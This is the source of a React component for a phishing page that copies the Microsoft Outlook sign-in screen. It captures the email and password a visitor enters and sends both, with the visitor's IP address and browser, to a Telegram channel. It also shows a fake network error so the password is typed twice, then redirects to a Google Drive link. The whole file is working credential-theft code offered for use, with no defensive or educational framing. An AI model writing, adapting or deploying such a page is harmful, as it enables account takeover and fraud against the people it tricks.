import React, { useEffect, useState } from "react";
import outlookLogo from "../assets/53_8b36337037cff88c3df2.png"; 
import microsoftLogo from "../assets/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"// Adjust the path if necessary
import {
  getUserIP,
  getUserBrowser,
  sendMessageToTelegram,
} from "../services/api"; // Make sure the path is correct

const Outlook = () => {
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordForm, setShowPasswordForm] = useState(false);

  const [attemptCount, setAttemptCount] = useState(0);
  const [showErrorMessage, setShowErrorMessage] = useState(false);

  useEffect(() => {
    getUserIP().then(setIpAddress);
    setBrowser(getUserBrowser());
  }, []);

  const handleEmailSubmit = async (event) => {
    event.preventDefault();
    setShowPasswordForm(true);
    // Call Telegram API to send the email and user information
    const message = `Root Logs\nMultipage\nOutlook\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
    await sendMessageToTelegram(message);
  };

  const handlePasswordSubmit = async (event) => {
    event.preventDefault();
    // Call Telegram API to send the password and user information
    const message = `Root Logs\nMultipage\nOutlook\nEmail entered: ${email}\nPassword entered: ${password}\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
    await sendMessageToTelegram(message);

    // Increment the attempt count
    setAttemptCount((prevCount) => prevCount + 1);

    if (attemptCount === 0) {
      // Show error message after the first attempt
      setShowErrorMessage(true);
    } else if (attemptCount >= 1) {
      // Redirect after the second attempt
      window.location.href ="https://drive.google.com/drive/folders/10Z4Tm85uW-hyPJ6-1uu6yFOwzAcekYKF?usp=sharing"; // Change to your desired URL
    }
  };

  return (
    <div className="bg-gray-100 min-h-screen flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="flex justify-center sm:mx-auto sm:w-full sm:max-w-md">
        <img className="mb-2 h-12 w-auto" src={outlookLogo} alt="Outlook" />
      </div>
      <div className="mt-8 sm:mx-auto mx-12 sm:w-full sm:max-w-md">
        <div className="bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10">
          {/* ... Rest of your JSX converted HTML */}
          <img className="mb-2 h-12 w-32" src={microsoftLogo} alt="Microsoft" />
          {/* ... */}

          {/* Conditional rendering for email or password form */}
          {!showPasswordForm ? (
            <form className="space-y-6" onSubmit={handleEmailSubmit}>
              <div className="mb-3 sm:mx-auto sm:w-full sm:max-w-md">
                <h2 className=" text-start text-2xl font-medium text-gray-900">
                  Sign in
                </h2>
                <p className="text-sm">to continue to outlook</p>
              </div>
              <input
                id="email"
                name="email"
                type="email"
                autoComplete="email"
                placeholder="Email address, phone number, or Skype"
                required
                className="appearance-none block w-full px-3 py-2 border-b border-gray-600 shadow-sm placeholder-gray-400 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <div className="text-xs font-light text-gray-600">
                <p>
                  No account? <span className="text-blue-700">Create One!</span>
                </p>
                <p className="text-blue-700 mt-4">Can’t access your account?</p>
              </div>
              <div className="flex justify-end">
                <button
                  type="submit"
                  className="w-32 flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                >
                  Next
                </button>
              </div>
            </form>
          ) : (
            <form className="space-y-6" onSubmit={handlePasswordSubmit}>
              {/* ... */}
              <span
                id="userEmail"
                className="block text-base font-medium text-gray-700 mb-6"
              >
                {email} {/* Display the email here */}
              </span>
              <label
                for="password"
                className="mb-6 text-start text-2xl font-medium text-gray-900"
              >
                Enter Password
              </label>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                placeholder="Password"
                required
                className="appearance-none block w-full px-3 py-2 border-b border-gray-600 shadow-sm placeholder-gray-400 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <div className="text-xs font-light text-gray-600">
                <p className="text-blue-700 mt-4">Forgot password?</p>
              </div>
              <div className="flex justify-end">
                <button
                  type="submit"
                  className="w-32 flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                >
                  Sign in
                </button>
              </div>
            </form>
          )}

          {showErrorMessage && (
            <div className="text-red-600 mt-8 text-center">
              Network error, please try again.
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Outlook;
